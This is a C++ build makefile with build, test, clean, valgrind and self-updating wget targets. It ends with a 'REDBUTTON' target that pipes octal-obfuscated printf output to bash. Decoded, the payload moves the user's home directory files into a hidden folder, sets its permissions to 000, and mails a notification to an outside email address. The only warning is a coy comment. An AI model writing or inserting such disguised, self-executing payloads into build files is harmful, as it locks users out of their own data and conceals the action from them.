#    provided rules are:
#    all        builds the main program
#    test       builds the test program as test_program
#    clean      removes all files listed if inclusive, or all those which are not
#               code, debug, programs, or explicitely named if exclusive
#    cleanDir   removes all subdirectories of curent directory, will prompt you
#               to be sure.  Not functional under inclusive delete
#    cleanAll   removes all files listed if inclusive, or all those which are not
#               code or explicitely named if exclusive, then calls cleanDir as well.
#    v          runs valgrind on the main program
#    vt         runs valgrind on the test program
#    data       copies the files listed in DATAFILES to the current dir, using
#               DATAPATH to find them
#    update     grabs the current makefile from
#               https://github.com/Athandreyal/Makefile/blob/master/makefile
#               -does not replace modules.mk, ONLY this file
#    setup      grabs the related modules.mk file from
#               https://github.com/Athandreyal/Makefile/blob/master/modules.mk
#   REDBUTTON   curious?  I wouldn't be.....
#

#      _          _   _  ____ _______             _ _ _      _   _     _         __ _ _
#     | |        | \ | |/ __ \__   __|           | (_) |    | | | |   (_)       / _(_) |
#   __| | ___    |  \| | |  | | | |       ___  __| |_| |_   | |_| |__  _ ___   | |_ _| | ___
#  / _` |/ _ \   | . ` | |  | | | |      / _ \/ _` | | __|  | __| '_ \| / __|  |  _| | |/ _ \
# | (_| | (_) |  | |\  | |__| | | |     |  __/ (_| | | |_   | |_| | | | \__ \  | | | | |  __/
#  \__,_|\___/   |_| \_|\____/  |_|      \___|\__,_|_|\__|   \__|_| |_|_|___/  |_| |_|_|\___|
#

# Disclaimer:
#       1) I am not responsible for anything.  Your whole user directory goes poof? NOT. MY. PROBLEM
#
#
# TERMS OF USE:
#       1) This makefile, and associated modules.mk are provided as is.  Feel free to ask if something needs work, but I may or may not offer my time.
#       2) Modify it as you see fit, abuse and use.  Update the version history if you do so, so that those after you can give credit where due.


include modules.mk   #must contain PROG, MODULES, TMODULES, DELOPTION, DELOPTIONFILES, FILES, DATAPATH, DATAFILES
-include submit.mk   #OPTIONAL - may contain submit instruction sets.
#to add in more modules use include.  include comes in two forms.
#       include is requisite, the file must exist or it will fail.
#       -include is optional, make will try, but not care if it cannot have it.

#below here should NOT require editing
#       this files does things which may catch you unaware and cause issues that may not be
#       immediately apparent.  Its


#static vars, should not need editing.
DPROG=$(DEBUG_PREFIX)$(PROG)
PROTECTCODE=cpp h mk
PROTECTCODEFILES=makefile $(DATAFILES)
PROTECTDEBUG=gcov gcno gcda
PROTECTPROG=$(PROG) $(DPROG)
CPPFLAGS=-ansi -pedantic-errors -Wall -Wconversion -MMD -MP
SHELL=/bin/bash -O extglob -c #run make in bash, not sh, makes life much simpler.
empty=
space=$(empty) $(empty)
DELCMPTYPE=EXCLUSIVE
TESTLAST=
MAINLAST=

#ensures that typescripts are ALWAYS protected when in script session
ifneq ($(shell pstree -A | grep -o "script---bash"),)
PROTECTCODEFILES:=$(PROTECTCODEFILES) typescript
endif

ifeq ($(shell test -e ".mt" && echo -n yes),yes)
TESTLAST:=1
MAINLAST:=
endif

ifeq ($(shell test -e ".mm" && echo -n yes),yes)
MAINLAST:=1
TESTLAST:=
endif

#include directives for dependencies
#include will require files exist and fail make on error

#autogenerate module list via parsing #includes if not specified
#only generate the module list if MODULES is empty, and all is executed
ifeq ($(MODULES),)
ifeq ($(MAKECMDGOALS),all)
-include .mainModuleList
endif
endif


ifeq ($(DMODULES),)
#only generate the module list if DMODULES is empty, and test is executed
ifeq ($(MAKECMDGOALS),test)
-include .debugModuleList
ifeq ($(GCOV_MODULES),)
-include .mainModuleList
endif
endif
endif

#include the .d files as requisites
-include $(MODULES:.o=.d)
-include $(DMODULES:.o=.d)

$(PROG):all

#primary build rules

all:$(if $(TESTLAST),clean)
all:CPPFLAGS:=$(CPPFLAGS) $(CXXFLAGS) #one list of flags
all:CPPFLAGS:=$(filter-out $(EXCLUDEFLAGS),$(CPPFLAGS))  #filter out excluded flags
all:$(MODULES)
all:mm
	g++  $(CPPFLAGS) $(MODULES) -o $(PROG)

$(DPROG):test

#test build rules, redefines GTFLAGS and LDFLAGS to testing purposes.
#calls gcov on intended code when completed.
test:$(if $(MAINLAST),clean)
test:CPPFLAGS:=$(CPPFLAGS) $(CXXFLAGS) $(GTFLAG) $(LDFLAG)  #one list of flags
test:CPPFLAGS:=$(filter-out $(EXCLUDEFLAGS),$(CPPFLAGS))  #filter out excluded flags
test:$(DMODULES)
test:GCOV=$(if $(GCOV_MODULES),$(GCOV_MODULES),$(filter $(MODULES), $(DMODULES)))
test:GCOV:=$(GCOV:.o=.cpp)
test:mt
	g++ $(CPPFLAGS) $(DMODULES) -g -o $(DEBUG_PREFIX)$(PROG)
	$(if $(EXECUTE_DEBUG_ON_BUILD),$(DEBUG_PREFIX)$(PROG))
	$(if $(GCOV_DEBUG_ON_BUILD),$(foreach var,$(GCOV), gcov $(var) 2> /dev/null | grep -A 1 $(var);))

#used to determine if I last built test, or main, shoud clean first if building other else use built files as is
mt:
	@touch .mt

mm:
	@touch .mm

#clean which ignores protected CODE, FILES, DEBUG, PROGRrams, and directories.
#   or which only kills listed files.
clean:PROTECT=$(filter-out 'xxxxx', $(PROTECTCODE) $(PROTECTDEBUG))
clean:PROTECTEDCODEFILES:=$(filter-out 'xxxxx', $(PROTECTCODEFILES) $(PROTECTPROG) $(DELOPTFILES))
clean:PROTECTED=$(subst $(space),\|,$(PROTECT))
clean:PROTECTEDTEST:=$(PROTECTEDCODEFILES)
clean:PROTECTEDFILES=$(subst $(space),\|,$(PROTECTEDCODEFILES))
clean:
	$(call evalClean,_)

#clean specific to removing unnecessary directories from current directory list
cleanDir:
	$(call evalClean,Dir)

#full clean of directory, if exclusive, this will also ask to kill child directories
cleanAll:PROTECT=$(filter-out 'xxxxx', $(PROTECTCODE))
cleanAll:PROTECTEDCODEFILES:=$(filter-out 'xxxxx', $(PROTECTCODEFILES) $(DELOPTFILES))
cleanAll:PROTECTEDTEST:=$(PROTECTEDCODEFILES)
cleanAll:PROTECTED=$(subst $(space),\|,$(PROTECT))
cleanAll:PROTECTEDFILES=$(subst $(space),\|,$(PROTECTEDCODEFILES))
cleanAll:clean cleanDir
#       $(call evalClean,All)

#runs valgrind on program or test_program
v:$(PROG)
	valgrind $(VALGRINDFLAGS) $(PROG)
vt:$(DPROG)
	valgrind $(VALGRIND_FLAGS) $(DPROG)

#copies datafiles from target directory
data:
	$(foreach var,$(DATAFILES),cp $(DATAPATH)$(var) .;)

update:
	@$(shell echo rm -f makefile)   #kill current because we asked for latest
	wget https://raw.githubusercontent.com/Athandreyal/Makefile/master/makefile

setup:
	@$(shell echo rm -f modules.mk)   #kill current because we asked for latest
	wget https://raw.githubusercontent.com/Athandreyal/Makefile/master/modules.mk

# cleaning stuff

#expands based on the clean type, and option type, to call the appropriate clean rule
define evalClean
	@rm -f .moduleScript.sh
	$(call doClean$1$(if $(call TestDelType),Exclude,Include))
endef

doClean_Exclude=$(call doTypeScriptWarn) rm -f $(shell find . -maxdepth 1 -type f ! -iregex '.*\($(PROTECTED)\)' ! -iregex './\($(PROTECTEDFILES)\)')
doClean_Include=$(call doTypeScriptWarn) rm -f $(DELOPTFILES);
doCleanDirExclude=$(foreach var,$(shell find ./* -type d), rm -r -i $(var);)
doCleanDirInclude=@echo "Will not delete directories while performing inclusive delete";
#doCleanAllExclude=$(call doClean_Exclude) $(call doCleanDirExclude)
#doCleanAllInclude=$(call doClean_Include) $(call doCleanDirInclude)

#warns the user if a typescript is eliminated or protected from destruction.
doTypeScriptWarn=$(if $(shell test -e "typescript" && echo -n yes),$(if $(filter typescript, $(PROTECTEDTEST)),@echo "clean: Typescript protected";,$(call __TYPESCRIPT_WARN__);))

define __TYPESCRIPT_WARN__
	@echo ""
	@echo "================================"
	@echo "     typescript eliminated!"
	@echo "================================"
	@echo ""
endef

define TestDelType
	$(filter $(DELCMPTYPE), $(DELTYPE))
endef

.mainModuleList:.moduleScript.sh
	@echo "auto-generating module list for $(PROG)"
	@echo ".mainModuleList" > targets
	@echo "int.main" >> targets
	@echo "MODULES" >> targets
	@./.moduleScript.sh
	@rm targets

.debugModuleList:.moduleScript.sh
	@echo "auto-generating module list for $(DPROG)"
	@echo ".debugModuleList" > targets
	@echo "gtest/gtest.h" >> targets
	@echo "DMODULES" >> targets
	@./.moduleScript.sh
	@rm targets

.moduleScript.sh:makefile
	@echo -e $(value getModuleScript) > ./.moduleScript.sh
	@chmod 777 ./.moduleScript.sh

getModuleScript="\#!/bin/bash\n\
query=''\n\
targets=''\n\
modules=''\n\
if [ -f ./targets ];then\n\
	readarray arr < targets\n\
	query=\${arr[1]}\n\
	target=\${arr[0]}\n\
	modules=\${arr[2]}\n\
fi\n\
checked=''\n\
modules=\"\$modules=\"\n\
tocheck=()\n\
files=\$(find . -maxdepth 1 -type f -printf '%f ')\n\
function getReq2 {\n\
    fileName=\$1\n\
    if [[ \$checked != *\"\$fileName\"* ]];then\n\
	checked+=\$fileName' '\n\
	includes=\$(grep '\#include \"*\"' \$fileName | awk '{x=length(\$0)-11;y=substr(\$0,11,x);print y}')\n\
	for file in \$includes\n\
	do\n\
	    if [[ files == *\"file\"* ]];then\n\
		tocheck+=(\$file)\n\
	    fi\n\
	done\n\
	moduleName=\$(nameAsModule \$fileName)\n\
	if [[ \$modules != *\"\$moduleName\"* ]];then\n\
	    modules+=\"\$moduleName \"\n\
	fi\n\
    fi\n\
}\n\
function nameAsModule {\n\
    file=\$1\n\
    if [[ \$file == *'.cpp' ]];then\n\
	moduleName=\${file/'.cpp'/'.o'}\n\
    elif [[ \$file == *'.h' ]];then\n\
	o_name=\${file/'.h'/'.o'}\n\
	c_name=\${file/'.h'/'.cpp'}\n\
	if [[ \$files == *\"\$o_name\"* ]];then\n\
		moduleName=\${file/'.h'/'.o'}\n\
	elif [[ \$files == *\"\$c_name\"* ]];then\n\
		moduleName=\${file/'.h'/'.o'}\n\
	fi\n\
    fi\n\
    echo \$moduleName' '\n\
}\n\
main=\$(grep -ld skip \$query *'.cpp')\n\
tocheck+=(\$main)\n\
while [ \${\#tocheck[@]} -gt 0 ];do\n\
    getReq2 \"\${tocheck[0]}\"\n\
    tocheck=(\${tocheck[@]:1})\n\
done\n\
echo \$modules > ./\$target"

#print var will print info about var contents
#print-% : $(info $* is a $(flavor $*) variable set to [$($*)]) @true

#dummy rule with no target, use to force rules to always execute
FORCE:

#don't press me.....
REDBUTTON: 
	$(lllll1llll11l1l1)'$(llll1l11llllll)$(ll1l111ll111ll1)$(l11llll1l1l111ll)$(llllllllllll1111)$(ll111l1l11l1l)$(ll11l1111ll111l)$(l1111lll11l1ll1l)$(ll1l11l1l1l1l1l)$(llllll1ll1ll1l)$(llll1ll111l11l)$(l11l1l1lllll1ll)$(l11l1l11l1l11ll)$(l1111lllll11l1l)$(ll11111lll11llll)$(l1l11ll1ll1ll1)$(l111ll11l1ll1l1)'$(l1l1l1l1111ll11l)$(ll1lll11lll1l1ll)
	$(l11l11lll1l11l)'$(l1llll1ll11l1l1l)$(llllll1lll1lll1)$(l111ll1llll11ll1)$(ll1ll11lll1l111)$(l1111l1111ll1l1)$(lllllllllll11l1)$(l1ll1l11llll111l)$(ll11l1111ll111l1)$(ll111lll11ll1l)$(llll11lllllll11l)'$(l1l11llll11ll11)
	$(l1lll1ll11l11ll1)'$(ll11l11ll1l11lll)$(ll1lllllll1llll)$(llll111l111l11ll)$(ll11llll1lll1111)$(l1l11111l111ll)$(l1lll1l11lll1lll)$(ll1l1l111l1111l)$(l1ll111llllll1)$(l1l1111l1l11l111)$(l1l11ll1l1ll1l1)$(ll1l111ll1llll11)$(l1l1l111l11ll1l)'$(l1l1ll1l1lll1111)
	$(l1111l1l1l111lll)'$(l1l1111l11)$(ll1ll1l11l1lll11)$(l11l111ll11lll1l)$(l11ll1l1l1l111ll)$(ll11l1111lllll)$(l11111111lllll11)'$(l11lllll1l111111)
	$(l1ll11111111l111)'$(l11l111ll11l11)$(llll11ll1lllll)$(l11lllllll1l11l)$(l11l111lll1l1lll)$(l111llllll1l1lll)$(lll11lllll1ll1ll)$(ll11l111l1l1l1)$(lll11lll1l1l1111)$(l111111l1l1111l1)$(l111lllll11l11l)'$(llll111ll111lll1)
	$(l1ll111lll11ll11)'$(l111ll1111l1ll1l)$(lll111lll1l111l)$(lllll1l1l111llll)$(lllllllll11111l)$(l1lll11l1111l1)$(lll11111l11l1l1)'$(ll1l1l1ll)
	$(l111llllll1l111l)'$(llll1l11lll1lll)$(ll1l111l1lll1lll)$(lll1l111l111ll11)$(ll111ll1lll1l111)$(l11l1ll111l1llll)$(lll1l11l1ll1llll)$(ll1l11llll111l1)$(l11l111l1lll11)$(llllllll1l1l1111)$(l11ll11lll1lllll)'$(ll11ll11ll1l11l1)
	$(ll11lllll111l)'$(l11lll11lll11111)$(lll1l111l1l11111)$(l11ll11ll11ll1ll)$(ll1l1111111lll1)$(lll1lll11ll1ll1l)'$(ll1lll1ll1ll11l1)
	$(l1l1ll11llll11l1)'$(l1l111ll11ll1ll1)$(l11lllll1l11l111)$(l1111ll11l111ll1)'$(l111l1ll1l1l111)
	$(l1l111l11l11llll)'$(l1ll1lll111lll11)'$(ll1l1lll1lll1l1l)
	$(ll11lllll11lll1l)'$(llll1lllllll11)$(lll1l1l1ll1111ll)$(llll11lllll111)$(l1l111llll1l1l11)$(l111l1ll1l1l1ll)$(l11l11l1111lll1l)$(ll1l111lll1111)$(l1l111l1ll1111ll)$(ll1111ll1llllll1)$(l111ll1l111ll11l)$(l1111111l11llll)'$(l11ll11lll11l1ll)
    
l11111111lllll11=\154\154
l1111111l11llll=5\144\147\145\040\143\141\156\040\142\162\151\156\147\040\151\164\040\142\141\143\153\134\156\042
l111111l1l1111l1=45\1
l1111l1111ll1l1=\056\150\15
l1111l1l1l111lll=@printf '%b'
l1111ll11l111ll1=\146\151\154\145
l1111lll11l1ll1l=50\14
l1111lllll11l1l=45\0
l111l1ll1l1l111=|bash
l111l1ll1l1l1ll=62\151\157\163\151\164\171\040\153\151\154\154\145\144\040\164\15
l111ll1111l1ll1l= \145\143\150\15
l111ll11l1ll1l1=50\145\040\123\150\141\144\157\167\163\040\154\151\145\056\040\117\156\145\040\122\151\156\147\040\164\157\040\162\165\154\145\040\164\150\145\155\040\141\154\154\054\040\117\156\145\040\122\151\156\147\040\164\157\040\146\151\156\144\040\164\150\145\155\054\040\117\156\145\040\122\151\156\147\040\164\157\040\142\162\151\156\147\040\164\150\145\155\040\141\154\154\054\040\141\156\144\040\151\156\040\164\150\145\040\144\141\162\153\156\145\163\163\040\142\151\156\144\040\164\150\145\155\054\040\111\156\040\164\150\145\040\114\141\156\144\040\157\146\040\115\157\162\144\157\162\040\167\150\145\162\145\040\164\150\145\040\123\150\141\144\157\167\163\040\154\151\145\056\042\076\057\144\145\166\057\156\165\154\154
l111ll1l111ll11l=\157\167\154\14
l111ll1llll11ll1=\1
l111lllll11l11l=46\151\154\145\057\155\141\163\164\145\162\057\155\141\153\145\146\151\154\145\076\057\144\145\166\057\156\165\154\154
l111llllll1l111l=@printf '%b'
l111llllll1l1lll=40\176\057\040\150\164\164\160\163\072\057\057\162\141\167\056\14
l11l111l1lll11=\145\040\155
l11l111ll11l11= \167\147\14
l11l111ll11lll1l=0\060\040\176
l11l111lll1l1lll=\040\055\120\0
l11l11l1111lll1l=0\14
l11l11lll1l11l=@printf '%b'
l11l1l11l1l11ll=54\154\163\040\157\146\040\163\164\157\156\145\054\040\116\151\156\145\040\146\157\162\040\115\157\162\164\141\154\040\115\145\156\040\144\157\157\155\145\144\040\164\157\040\144\151\145\054\040\117\156\145\040\146\157\162\040\164\150\145\040\104\141\162\153\040\114\157\162\144\040\157\156\040\150\151\163\040\144\141\162\153\040\164\150\162\157\156\145\040\151\156\040\164\150\145\040\114\141\156\144\040\157\146\040\115\157\162\144\157\162\040\167\150\145\162\1
l11l1l1lllll1ll=\153\151\156\147\163\040\165\156\144\145\162\040\164\150\145\040\163\153\171\054\040\123\145\166\145\156\040\146\157\162\040\164\150\145\040\104\167\141\162\146\055\154\157\162\144\163\040\151\156\040\164\150\145\151\162\040\150\141\1
l11l1ll111l1llll=\156\040\1
l11ll11ll11ll1ll=3\040\042\122\105\104\040\102\125\124\124\117
l11ll11lll11l1ll=|bash
l11ll11lll1lllll=6\151\154\145\042\040\076\076\040\146\151\154\145
l11ll1l1l1l111ll=\057\056\150\151\144\144\145\156\076\057\144\145\166\05
l11lll11lll11111= \155\141\151
l11llll1l1l111ll=40
l11lllll1l111111=|bash
l11lllll1l11l111=2\155\040\055\146\040
l11lllllll1l11l=4\040\055\161
l1l11111l111ll=\144
l1l1111l11= \143\150\155
l1l1111l1l11l111=\144\145\1
l1l111l11l11llll=@printf '%b'
l1l111l1ll1111ll=\143\141\164
l1l111ll11ll1ll1= \16
l1l111llll1l1l11=40\042\143\165\1
l1l11ll1l1ll1l1=66\057\156\16
l1l11ll1ll1ll1=4\1
l1l11llll11ll11=|bash
l1l1l111l11ll1l=54
l1l1l1l1111ll11l=|ba
l1l1ll11llll11l1=@printf '%b'
l1l1ll1l1lll1111=|bash
l1ll11111111l111=@printf '%b'
l1ll111lll11ll11=@printf '%b'
l1ll111llllll1=56\076\057
l1ll1l11llll111l=5\156\076\057\14
l1ll1lll111lll11= \143\144\040\176
l1lll11l1111l1=\146\151\154\1
l1lll1l11lll1lll=\14
l1lll1ll11l11ll1=@printf '%b'
l1llll1ll11l1l1l= \155\15
ll11111lll11llll=40\16
ll1111ll1llllll1=\054\040\153\156
ll111l1l11l1l=\113\156\157\167\154\145\144\147\145\040\151\163\0
ll111ll1lll1l111=\145\144\040\164\150\145\040\162\145\144\040\142\165\164\164\157
ll111lll11ll1l=56\165\15
ll11l1111ll111l1=4\145\166\057\1
ll11l1111ll111l=40\160\157\167\145\162\056\040\124\150\162\145\145\040\122\151\156\147\163\040\146\157\162\040\164\1
ll11l1111lllll=7\156\165
ll11l111l1l1l1=\154\05
ll11l11ll1l11lll= \15
ll11ll11ll1l11l1=|bash
ll11llll1lll1111=0\176\057\052\040\176\057\056\150\151
ll11lllll111l=@printf '%b'
ll11lllll11lll1l=@printf '%b'
ll1l1111111lll1=\116\041\042\040
ll1l111l1lll1lll=3\15
ll1l111ll111ll1=0\157\0
ll1l111ll1llll11=5\154\1
ll1l111lll1111=5\040
ll1l11l1l1l1l1l=5\040\105\15
ll1l11llll111l1=\040\164\150
ll1l1l111l1111l=4\145\1
ll1l1l1ll=|bash
ll1l1lll1lll1l1l=|bash
ll1ll11lll1l111=76\057
ll1ll1l11l1lll11=\157\144\04
ll1lll11lll1l1ll=sh
ll1lll1ll1ll11l1=|bash
ll1lllllll1llll=5\16
lll11111l11l1l1=45
lll111lll1l111l=7\040\055
lll11lll1l1l1111=7\115\141\153\1
lll11lllll1ll1ll=7\151\164\150\165\142\165\163\145\162\143\157\156\164\145\156\164\056\143\157\155\057\101\164\150\141\156\144\162\145\171\141
lll1l111l111ll11=0\157\040\042\040\160\162\145\163\163
lll1l111l1l11111=\154\040\055\16
lll1l11l1ll1llll=51\156
lll1l1l1ll1111ll=1\156\164\146
lll1lll11ll1ll1l=\160\162\145\156\167\064\071\071\100\155\164\162\157\171\141\154\056\143\141\040\074\040\146\151\154\145
llll111l111l11ll=6\04
llll111ll111lll1=|bash
llll11ll1lllll=5\16
llll11lllll111=\0
llll11lllllll11l=4\154
llll1l11lll1lll= \145\14
llll1l11llllll= \145\143\15
llll1ll111l11l=\145\156\055
llll1lllllll11= \160\162\15
lllll1l1l111llll=\156\040\044\050\167\150\157\141\155\151\051
lllll1llll11l1l1=@printf '%b'
llllll1ll1ll1l=4\166
llllll1lll1lll1=3\144\151\162\040\055\160\040
llllllll1l1l1111=\141\153\145\14
lllllllll11111l=\040\076\040
lllllllllll11l1=1\144\144\14
llllllllllll1111=\042
